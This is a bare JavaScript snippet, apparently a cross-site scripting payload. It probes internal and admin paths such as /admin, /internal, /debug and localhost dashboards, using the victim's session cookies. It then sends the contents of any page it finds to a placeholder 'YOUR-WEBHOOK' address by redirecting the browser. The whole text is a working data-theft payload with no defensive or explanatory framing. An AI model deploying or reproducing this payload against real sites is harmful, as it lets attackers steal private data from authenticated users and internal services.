(async()=>{
  const paths=[
    '/dashboard','/security','/admin','/internal','/debug','/reports',
    'http://127.0.0.1/dashboard',
    'http://127.0.0.1/security',
    'http://localhost/dashboard',
    'http://localhost/security'
  ];

  for (const p of paths){
    try{
      const r = await fetch(p,{credentials:'include'});
      const t = await r.text();
      if (r.status !== 404 && t){
        location='https://YOUR-WEBHOOK/?d='+encodeURIComponent((p+'::'+t).slice(0,1500));
        break;
      }
    }catch(e){}
  }
})();